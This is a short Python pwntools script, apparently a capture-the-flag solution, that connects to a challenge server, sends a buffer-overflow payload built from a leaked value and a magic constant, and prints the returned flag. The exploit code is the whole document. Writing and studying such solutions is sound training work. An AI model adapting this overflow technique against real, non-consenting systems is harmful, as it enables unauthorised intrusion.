#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './bigof')
lib = CDLL(exe.libc.path)
host = args.HOST or 'srdnlen.doliv.cc'
port = int(args.PORT or 34003)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def vers_libc(function):
    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
br *main+92
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = b"A"*31
io.sendlineafter(B"?", payload)
io.recvline()
# io.recvline()
io.recvuntil(b"\n")
leak = unpack(io.recvuntil(b"but")[:-3])
payload = b"A" * 32 + p64(leak) + p64(0x5ab1bb0) 
# payload = b"A"*44 + p32(0x5ab1bb0)
io.sendlineafter(b": ", payload)
resp = io.recvline()
flag = io.recvline().split(b" ")[-1].strip().decode()

print(flag)

io.close()